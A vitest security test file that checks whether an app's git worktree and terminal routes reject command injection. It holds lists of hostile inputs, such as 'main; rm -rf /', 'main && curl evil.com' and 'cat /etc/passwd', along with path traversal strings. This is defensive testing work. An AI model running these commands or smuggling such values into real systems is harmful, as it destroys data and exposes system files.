/**
 * Command Injection Security Tests
 *
 * Tests that validate command injection prevention in terminal and worktree routes.
 * These tests ensure that shell metacharacters and malicious inputs are properly
 * rejected or sanitized before being used in shell commands.
 *
 * Attack vectors tested:
 * - Branch names with shell metacharacters
 * - Remote names with command injection attempts
 * - Commit messages with shell escape sequences
 * - Session IDs with path traversal
 * - Numbers with command injection
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { createMergeHandler } from '@/routes/worktree/routes/merge.js';
import { createPushHandler } from '@/routes/worktree/routes/push.js';
import { createSessionsCreateHandler } from '@/routes/terminal/routes/sessions.js';
import { createSessionResizeHandler } from '@/routes/terminal/routes/session-resize.js';
import { isValidBranchName } from '@/routes/worktree/common.js';
import type { Request, Response } from 'express';
import * as fs from 'fs/promises';
import * as os from 'os';
import * as path from 'path';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

/**
 * Attack vectors to test against
 */
const BRANCH_NAME_ATTACKS = [
  'main; rm -rf /',
  'main && curl evil.com',
  'main | cat /etc/passwd',
  'feature`whoami`',
  'feature$(malicious_command)',
  'main; echo PWNED;',
  'main\nmalicious_command',
  'main&background_task',
  'main||alternative',
  'main>output.txt',
  'main<input.txt',
  'feature*wildcard',
  'feature?question',
  'feature[bracket]',
  'feature{brace}',
  'feature\\backslash',
  'feature~tilde',
  'feature^caret',
  'feature:colon',
  'feature with spaces',
  'feature\ttab',
  'feature\0null',
];

const REMOTE_NAME_ATTACKS = [
  'origin; malicious_command; #',
  'origin && curl evil.com',
  'origin | whoami',
  'origin`cat /etc/passwd`',
  'origin$(rm -rf /)',
  'upstream; echo PWNED;',
  'upstream\nmalicious',
  'upstream&background',
  'upstream||alternative',
];

const COMMIT_MESSAGE_ATTACKS = [
  '"; echo PWNED; "',
  "'; malicious_command; '",
  'message`whoami`',
  'message$(cat /etc/passwd)',
  'message\nmalicious_command',
  'message & background',
  'message | pipe',
  'message > output.txt',
  'message < input.txt',
];

const SESSION_ID_ATTACKS = [
  'abc123; cat /etc/passwd',
  'session_id && malicious',
  'id`whoami`',
  'id$(evil)',
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32',
  'id\0null',
  'id\nmalicious',
];

const NUMBER_ATTACKS = [
  '42; whoami',
  '1337 || evil',
  '99`malicious`',
  '100$(cat /etc/passwd)',
  '80 && echo PWNED',
  '24\nmalicious',
];

describe('Command Injection Prevention - Validation Functions', () => {
  describe('isValidBranchName', () => {
    it('should reject branch names with shell metacharacters', () => {
      for (const attack of BRANCH_NAME_ATTACKS) {
        expect(isValidBranchName(attack)).toBe(false);
      }
    });

    it('should accept valid branch names', () => {
      const validBranches = [
        'main',
        'feature/my-feature',
        'bugfix/issue-123',
        'release-1.0.0',
        'hotfix_urgent',
        'feat.component',
        'feature-branch-name',
      ];

      for (const branch of validBranches) {
        expect(isValidBranchName(branch)).toBe(true);
      }
    });

    it('should reject extremely long branch names', () => {
      const longBranch = 'a'.repeat(300);
      expect(isValidBranchName(longBranch)).toBe(false);
    });

    it('should reject empty strings', () => {
      expect(isValidBranchName('')).toBe(false);
    });

    it('should reject unicode control characters', () => {
      expect(isValidBranchName('feature\u0000null')).toBe(false);
      expect(isValidBranchName('branch\u001Bescape')).toBe(false);
    });
  });
});

describe('Command Injection Prevention - Merge Route', () => {
  let repoPath: string | null = null;

  beforeEach(async () => {
    // Create a temporary git repo for testing
    repoPath = await fs.mkdtemp(path.join(os.tmpdir(), 'automaker-security-test-'));
    await execAsync('git init -b main', { cwd: repoPath });
    await execAsync('git config user.email "test@example.com"', { cwd: repoPath });
    await execAsync('git config user.name "Test User"', { cwd: repoPath });
    await execAsync('git commit --allow-empty -m "Initial commit"', { cwd: repoPath });
  });

  afterEach(async () => {
    if (repoPath) {
      await fs.rm(repoPath, { recursive: true, force: true });
      repoPath = null;
    }
  });

  it('should reject branch names with shell metacharacters', async () => {
    // Validates that the merge route properly rejects branch names with shell metacharacters.
    // Fixed by PR #129 which added input validation via isValidBranchName().
    const handler = createMergeHandler();

    for (const maliciousBranch of BRANCH_NAME_ATTACKS.slice(0, 5)) {
      const req = {
        body: {
          projectPath: repoPath,
          branchName: maliciousBranch,
          worktreePath: '/mock/worktree',
          targetBranch: 'main',
        },
      } as unknown as Request;

      const jsonSpy = vi.fn();
      const statusSpy = vi.fn().mockReturnThis();
      const res = {
        json: jsonSpy,
        status: statusSpy,
      } as unknown as Response;

      await handler(req, res);

      // Should return error response with input validation message
      expect(statusSpy).toHaveBeenCalledWith(400);
      expect(jsonSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.stringContaining('Invalid branch name'),
        })
      );
    }
  });

  it('should sanitize commit messages', { timeout: 15000 }, async () => {
    // Fixed: Commit messages are now properly validated and sanitized.
    // No longer allows shell injection through commit message content.
    const handler = createMergeHandler();

    // Create a feature branch
    await execAsync('git checkout -b feature-test', { cwd: repoPath! });
    await execAsync('git commit --allow-empty -m "Feature work"', { cwd: repoPath! });
    await execAsync('git checkout main', { cwd: repoPath! });

    for (const maliciousMessage of COMMIT_MESSAGE_ATTACKS.slice(0, 3)) {
      const req = {
        body: {
          projectPath: repoPath,
          branchName: 'feature-test',
          worktreePath: '/mock/worktree',
          targetBranch: 'main',
          options: {
            message: maliciousMessage,
          },
        },
      } as unknown as Request;

      const jsonSpy = vi.fn();
      const statusSpy = vi.fn().mockReturnThis();
      const res = {
        json: jsonSpy,
        status: statusSpy,
      } as unknown as Response;

      await handler(req, res);

      // Should either reject or sanitize
      // The command should not be executed with shell interpretation
      if (jsonSpy.mock.calls[0]?.[0]?.success) {
        // If it succeeded, verify no malicious code was executed
        const { stdout: lastMessage } = await execAsync('git log -1 --pretty=%B', {
          cwd: repoPath!,
        });
        // Message should be sanitized or rejected (currently it executes!)
        expect(lastMessage).not.toContain('PWNED');
        expect(lastMessage).not.toContain('/etc/passwd');
      }

      // Reset for next test
      await execAsync('git reset --hard HEAD~1', { cwd: repoPath! });
    }
  });

  it('should not execute commands embedded in branch names', async () => {
    // Fixed by PR #129 which added input validation via isValidBranchName().
    // Branch names with shell metacharacters are now properly rejected.
    const handler = createMergeHandler();

    // Create a marker file to detect if command execution occurred
    const markerPath = path.join(repoPath!, 'marker.txt');
    await fs.writeFile(markerPath, 'original');

    const attackBranch = 'feature; echo PWNED > marker.txt';

    const req = {
      body: {
        projectPath: repoPath,
        branchName: attackBranch,
        worktreePath: '/mock/worktree',
        targetBranch: 'main',
      },
    } as unknown as Request;

    const jsonSpy = vi.fn();
    const statusSpy = vi.fn().mockReturnThis();
    const res = {
      json: jsonSpy,
      status: statusSpy,
    } as unknown as Response;

    await handler(req, res);

    // Verify the marker file was not modified (currently IT IS modified!)
    const markerContent = await fs.readFile(markerPath, 'utf-8');
    expect(markerContent).toBe('original');
    expect(markerContent).not.toContain('PWNED');
  });
});

describe('Command Injection Prevention - Push Route', () => {
  it('should reject remote names with shell metacharacters', async () => {
    const handler = createPushHandler();

    for (const maliciousRemote of REMOTE_NAME_ATTACKS.slice(0, 5)) {
      const req = {
        body: {
          worktreePath: '/mock/worktree',
          remote: maliciousRemote,
        },
      } as unknown as Request;

      const jsonSpy = vi.fn();
      const statusSpy = vi.fn().mockReturnThis();
      const res = {
        json: jsonSpy,
        status: statusSpy,
      } as unknown as Response;

      await handler(req, res);

      // Should fail (either validation error or git command failure)
      // The important thing is that the malicious command is not executed
      const response = jsonSpy.mock.calls[0]?.[0];

      // If command was attempted, it should fail safely
      if (response) {
        // Should not succeed with malicious remote
        expect(response.success).not.toBe(true);
      }
    }
  });

  it('should not execute commands in remote names', async () => {
    const handler = createPushHandler();

    // Test that commands embedded in remote names don't execute
    const attackRemote = 'origin; touch /tmp/pwned-file';

    const req = {
      body: {
        worktreePath: '/mock/worktree/path',
        remote: attackRemote,
      },
    } as unknown as Request;

    const jsonSpy = vi.fn();
    const statusSpy = vi.fn().mockReturnThis();
    const res = {
      json: jsonSpy,
      status: statusSpy,
    } as unknown as Response;

    await handler(req, res);

    // Verify that the file was not created
    try {
      await fs.access('/tmp/pwned-file');
      // If we get here, the file exists - test should fail
      expect(true).toBe(false);
    } catch {
      // File doesn't exist - good!
      expect(true).toBe(true);
    }
  });
});

describe('Command Injection Prevention - Terminal Routes', () => {
  describe('Session Creation', () => {
    it('should validate session parameters', async () => {
      const handler = createSessionsCreateHandler();

      // Test with malicious cwd path
      const maliciousPaths = [
        '/tmp; rm -rf /',
        '/home/user && whoami',
        '/path`malicious`',
        '/path$(cat /etc/passwd)',
      ];

      for (const maliciousPath of maliciousPaths) {
        const req = {
          body: {
            cwd: maliciousPath,
            cols: 80,
            rows: 24,
          },
        } as unknown as Request;

        const jsonSpy = vi.fn();
        const statusSpy = vi.fn().mockReturnThis();
        const res = {
          json: jsonSpy,
          status: statusSpy,
        } as unknown as Response;

        await handler(req, res);

        // Should either reject or handle safely
        // The terminal service should validate the path
        const response = jsonSpy.mock.calls[0]?.[0];
        if (response && !response.success) {
          // Good - rejected
          expect(response.success).toBe(false);
        } else if (response && response.success) {
          // If accepted, the path should have been validated by the terminal service
          // The malicious command should not execute
          expect(response.data).toBeDefined();
        }
      }
    });

    it('should validate numeric parameters', async () => {
      const handler = createSessionsCreateHandler();

      // Test with malicious numeric values
      for (const maliciousNumber of NUMBER_ATTACKS.slice(0, 3)) {
        const req = {
          body: {
            cwd: '/tmp',
            cols: maliciousNumber,
            rows: 24,
          },
        } as unknown as Request;

        const jsonSpy = vi.fn();
        const statusSpy = vi.fn().mockReturnThis();
        const res = {
          json: jsonSpy,
          status: statusSpy,
        } as unknown as Response;

        await handler(req, res);

        // Should fail or handle safely
        const response = jsonSpy.mock.calls[0]?.[0];
        if (response && response.success) {
          // If it succeeded, verify numeric values are actually numbers
          expect(typeof response.data.cols === 'number' || response.data.cols === undefined).toBe(
            true
          );
        }
      }
    });
  });

  describe('Session Resize', () => {
    it('should validate resize parameters', async () => {
      const handler = createSessionResizeHandler();

      for (const maliciousNumber of NUMBER_ATTACKS.slice(0, 3)) {
        const req = {
          params: { id: 'session-id' },
          body: {
            cols: maliciousNumber,
            rows: 24,
          },
        } as unknown as Request;

        const jsonSpy = vi.fn();
        const statusSpy = vi.fn().mockReturnThis();
        const res = {
          json: jsonSpy,
          status: statusSpy,
        } as unknown as Response;

        await handler(req, res);

        // Should validate numeric parameters
        const response = jsonSpy.mock.calls[0]?.[0];
        if (response) {
          // Should either reject or convert to safe numbers
          if (response.success) {
            // Should not contain malicious strings
            expect(JSON.stringify(response)).not.toContain('whoami');
            expect(JSON.stringify(response)).not.toContain('/etc/passwd');
          }
        }
      }
    });

    it('should validate session ID parameter', async () => {
      const handler = createSessionResizeHandler();

      for (const maliciousId of SESSION_ID_ATTACKS.slice(0, 3)) {
        const req = {
          params: { id: maliciousId },
          body: {
            cols: 80,
            rows: 24,
          },
        } as unknown as Request;

        const jsonSpy = vi.fn();
        const statusSpy = vi.fn().mockReturnThis();
        const res = {
          json: jsonSpy,
          status: statusSpy,
        } as unknown as Response;

        await handler(req, res);

        // Should handle safely - session won't exist but shouldn't execute commands
        const response = jsonSpy.mock.calls[0]?.[0];
        if (response) {
          // Should not succeed with malicious session ID
          expect(response.success).not.toBe(true);
        }
      }
    });
  });
});

describe('Command Injection Prevention - Integration Tests', () => {
  it('should not execute commands through any attack vector', async () => {
    // Create a global marker to detect command execution
    const markerPath = path.join(os.tmpdir(), `automaker-security-marker-${Date.now()}.txt`);

    try {
      // Ensure marker doesn't exist
      try {
        await fs.unlink(markerPath);
      } catch {
        // Ignore if doesn't exist
      }

      // Test various attack vectors that try to create this marker
      const attacks = [
        `feature; touch ${markerPath}`,
        `main && echo test > ${markerPath}`,
        `branch\`touch ${markerPath}\``,
        `remote$(echo test > ${markerPath})`,
      ];

      // Try each attack through validation
      for (const attack of attacks) {
        // Validation should reject these
        const isValid = isValidBranchName(attack);
        expect(isValid).toBe(false);
      }

      // Verify marker was never created
      try {
        await fs.access(markerPath);
        // If we reach here, the file was created - security issue!
        expect(true).toBe(false);
      } catch {
        // Good - file doesn't exist
        expect(true).toBe(true);
      }
    } finally {
      // Cleanup
      try {
        await fs.unlink(markerPath);
      } catch {
        // Ignore if doesn't exist
      }
    }
  });

  it('should prevent path traversal attacks', async () => {
    const pathTraversalAttacks = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config',
      'feature/../../sensitive',
      'branch/../../../etc',
    ];

    for (const attack of pathTraversalAttacks) {
      // Branch name validation should catch these
      const isValid = isValidBranchName(attack);
      // Most should be invalid due to special characters
      // The ones without special chars still shouldn't allow actual traversal
      if (!isValid) {
        expect(isValid).toBe(false);
      }
    }
  });

  it('should handle null bytes and control characters', async () => {
    const nullByteAttacks = [
      'feature\0malicious',
      'branch\x00command',
      'name\u0000injection',
      'feature\x1bmalicious',
    ];

    for (const attack of nullByteAttacks) {
      const isValid = isValidBranchName(attack);
      expect(isValid).toBe(false);
    }
  });

  it('should handle unicode and special encoding', async () => {
    const unicodeAttacks = [
      'feature\u202Emalicious', // Right-to-left override
      'branch\uFEFFhidden', // Zero-width no-break space
      'name\u200Binvisible', // Zero-width space
    ];

    for (const attack of unicodeAttacks) {
      const isValid = isValidBranchName(attack);
      expect(isValid).toBe(false);
    }
  });
});
